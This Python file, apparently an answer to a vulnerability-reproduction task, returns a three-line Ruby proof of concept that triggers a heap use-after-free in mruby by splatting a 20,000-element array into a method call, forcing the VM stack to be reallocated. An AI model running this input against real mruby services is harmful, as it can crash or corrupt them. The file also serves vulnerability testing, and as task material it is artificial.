import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in mruby.
        
        The vulnerability allows a stale pointer (regs) to be used after the VM stack 
        has been reallocated by mrb_stack_extend(). This typically occurs when the 
        stack needs to grow to accommodate new values, such as when processing a 
        large number of arguments.
        
        The PoC creates a large array and passes it to a method using the splat 
        operator (*), which forces the VM to push all array elements onto the stack, 
        triggering the stack extension and the subsequent use-after-free.
        """
        
        # We use a large enough size to ensure realloc moves the memory.
        # 20000 elements is sufficient to exceed the default stack size (usually 128).
        poc = b"a = Array.new(20000, 0)\ndef f(*args); end\nf(*a)\n"
        
        return poc
